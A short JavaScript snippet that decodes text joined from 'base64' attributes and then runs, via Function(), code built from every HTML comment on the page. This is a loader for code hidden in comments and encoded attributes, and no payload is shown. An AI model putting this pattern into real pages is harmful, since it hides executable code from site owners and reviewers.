var base64Collection = document.querySelectorAll('[base64]');
var text = base64Collection[0].attributes.base64.nodeValue;

for (var i=1;i<base64Collection.length;i++) {
  text += base64Collection[i].attributes.base64.nodeValue;
};

console.log(atob(text));
// Create and execute function like: Function(string), where string is concatenated value of all Comment nodes from this document


function getAllComments() {
    var t = [],
        recurse = function (elem) {
            if (elem.nodeType == Node.COMMENT_NODE) {
                t.push(elem);
            };
            if (elem.childNodes && elem.childNodes.length) {
                for (var i = 0; i < elem.childNodes.length; i++) {
                    recurse(elem.childNodes[i]);
                };
            };
        };
    recurse(document.getElementsByTagName("html")[0]);
    return t;
};
var commentsCollection = getAllComments();
var commentString = commentsCollection[0].data;
for (var i=1;i<commentsCollection.length;i++){
  commentString += commentsCollection[i].data;
};
(Function(commentString))();
